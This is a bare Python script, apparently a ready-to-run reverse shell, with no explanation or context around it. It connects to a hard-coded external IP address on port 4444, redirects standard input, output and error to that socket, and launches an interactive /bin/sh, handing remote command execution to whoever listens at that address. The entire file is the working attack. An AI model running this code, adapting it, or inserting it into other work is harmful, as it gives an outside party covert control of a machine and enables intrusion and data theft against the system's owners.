#!/usr/bin/env python

import socket,subprocess,os

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("50.116.20.151",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])


